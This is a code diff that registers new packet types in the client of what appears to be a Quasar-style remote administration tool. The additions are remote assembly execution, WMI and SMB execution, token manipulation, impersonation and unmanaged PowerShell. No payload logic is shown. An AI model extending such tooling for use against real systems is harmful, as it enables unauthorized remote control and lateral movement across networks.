@@ -92,7 +92,20 @@ namespace xClient.Core.Packets
                 typeof (Packets.ServerPackets.GetMessage),
                 typeof (Packets.ClientPackets.GetStopChatAgent),
                 typeof (Packets.ServerPackets.DoStartChat),
-                typeof (Packets.ServerPackets.GetStopChatAgent)
+                typeof (Packets.ServerPackets.GetStopChatAgent),
+                typeof (Packets.ServerPackets.DoExecuteAssembly),
+                typeof (Packets.ClientPackets.DoExecuteAssemblyResponse),
+                typeof (Packets.ServerPackets.DoExecuteWMI),
+                typeof (Packets.ClientPackets.DoExecuteWMIResponse),
+                typeof (Packets.ServerPackets.DoSMBExec),
+                typeof (Packets.ClientPackets.DoSMBExecResponse),
+                typeof (Packets.ServerPackets.DoWMIExec),
+                typeof (Packets.ClientPackets.DoWMIExecResponse),
+                typeof (Packets.ServerPackets.GetChangeToken),
+                typeof (Packets.ClientPackets.GetChangeToken),
+                typeof (Packets.ServerPackets.DoEnableImpersonation),
+                typeof (Packets.ClientPackets.GetPowerPick),
+                typeof (Packets.ServerPackets.GetPowerPick)
 
             };
         }
